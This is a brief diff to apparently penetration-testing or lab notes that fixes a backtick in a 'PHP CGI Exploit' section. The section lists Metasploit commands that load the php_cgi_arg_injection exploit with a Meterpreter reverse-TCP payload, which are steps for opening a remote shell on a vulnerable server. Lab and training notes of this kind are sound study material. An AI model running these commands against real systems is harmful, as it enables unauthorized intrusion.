@@ -78,7 +78,7 @@ Verification:
 
 ## 6. PHP CGI Exploit
 
-- `msfconsole
+- `msfconsole`
 
 - `use exploit/multi/http/php_cgi_arg_injection`
 - `set PAYLOAD php/meterpreter/reverse_tcp`
